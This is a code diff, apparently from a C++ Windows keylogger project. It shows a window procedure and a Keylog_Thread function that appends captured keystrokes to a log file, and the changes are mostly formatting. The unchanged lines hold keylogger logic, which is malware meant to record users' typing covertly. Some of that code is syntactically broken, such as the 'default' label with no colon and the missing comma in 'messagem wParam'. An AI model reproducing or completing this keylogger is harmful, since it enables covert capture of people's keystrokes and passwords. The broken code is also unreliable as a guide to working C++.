@@ -2,6 +2,7 @@
 #include <cstdio>
 #include <iostream>
 #include "regaccess.h"
+
 using namespace std;
 
 LRESULT CALLBACK WindowsProcedure(HWND,UINT,WPARAM,LPARAM);
@@ -91,7 +92,7 @@ LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
             break;
         }
         default
-        return DefWindowProc (hwnd, messagem wParam, lParam);
+          return DefWindowProc (hwnd, messagem wParam, lParam);
     }
 DWORD WINAPI Keylog_Thread(LPVOID Param)
 {
@@ -119,18 +120,18 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
                 FILE *file;
                 file=fopen(szLog, "a+");
 
-                if(file==NULL)
+                if (file==NULL)
                     return 1;
 
-                if(file!=NULL)
+                if (file!=NULL)
                 {
-                    if((character>=39)&&(character<=64))
+                    if ((character>=39) && (character<=64))
                     {
                         fputc(character,file);
                         fclose(file);
                         break;
                     }
-                    else if((character>64)&&(character<91))
+                    else if ((character>64) && (character<91))
                     {
                         character+=32;
                         fputc(character,file);
